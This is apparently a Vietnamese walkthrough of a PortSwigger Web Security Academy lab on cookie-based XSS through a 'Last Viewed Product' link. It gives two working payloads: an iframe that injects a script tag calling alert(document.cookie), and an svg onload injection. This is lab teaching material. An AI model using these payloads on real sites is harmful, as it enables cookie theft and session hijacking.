**Yêu cầu: Chèn một cookie sẽ gây ra XSS và gọi hàm print()/alert()**
<br>Khi ta xem một bài viết bất kì sẽ tạo ra thẻ a có tên ```Last Viewed Product``` và setCookie là url bài viết ta vừa xem rồi lưu vào thẻ này.
![image](https://user-images.githubusercontent.com/62832067/150773542-a3db6fcf-4411-4dfd-837e-0a466fc48f95.png)
<br> **Cách 1:** Ta chèn trực tiếp script vào khi ta click vào thẻ ```Last Viewed Product```
```  js
<iframe src="https://ac521fc61f91bc2bc0803137007500d1.web-security-academy.net/product?productId=1&'>
<script>alert(document.cookie)</script>" 
onload="if(!window.x)this.src='https://ac521fc61f91bc2bc0803137007500d1.web-security-academy.net/product?productId=1&';window.x=1;">
```
<br> **Cách 2:** Ta cần tạo 1 url chứa payload, khi click vào, url này có thể được tạo bằng cách thêm 1 chuỗi vào phía sau của 1 product url bất kỳ
``` js
  <a href='ac521fc61f91bc2bc0803137007500d1.web-security-academy.net/product?productId=3&abc='>Hacked</a>
   <svg onload='alert(document.cookie)'> </svg>
   <a onload=''>Last viewed product</a>
   <p>|</p>
```
